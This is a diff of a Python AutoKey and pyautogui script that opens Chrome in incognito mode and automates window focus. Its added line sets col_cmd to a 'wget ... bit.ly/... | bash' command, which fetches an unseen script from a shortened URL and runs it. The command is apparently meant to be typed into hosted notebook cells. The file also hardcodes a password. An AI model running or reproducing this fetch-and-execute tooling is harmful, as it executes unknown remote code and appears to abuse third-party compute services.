@@ -3,7 +3,7 @@ import time,os
 from autokey import *
 import pyautogui
 
-col_cmd = "!wget -q -O - bit.ly/cpu02 | bash"
+col_cmd = "!wget -q -O - bit.ly/pysi002 | bash"
 listfile = '/home/one/g250p1'
 gpass = "Ms123456789"
 new = True
@@ -283,14 +283,19 @@ def get_speed():
 ############################# Main ############################
 ###############################################################
 pyautogui.FAILSAFE = False
-winTitle = window.get_active_title()
-winClass = window.get_active_class()
+
 system.exec_command("/usr/bin/google-chrome-stable --start-maximized --incognito %U", getOutput=False)
 window.wait_for_exist(r'.*hrome', timeOut=5)
-time.sleep(3*global_slow_motion)
+time.sleep(10*global_slow_motion)
+window.activate(title=r'.*hrome', switchDesktop=False, matchClass=False)
+time.sleep(1)
 window.wait_for_focus(r'.*hrome', timeOut=5)
 #mouse.wait_for_click(1)
 time.sleep(1)
+winTitle = window.get_active_title()
+winClass = window.get_active_class()
+#window.set_property(title=winClass,action='toggle' ,prop='maximized_vert',matchClass=True)
+time.sleep(10)
 
 #size_x = window.get_property(property_name, 0, 0, 255)
 #size_y = window.get_property(property_name, 0, 0, 255)
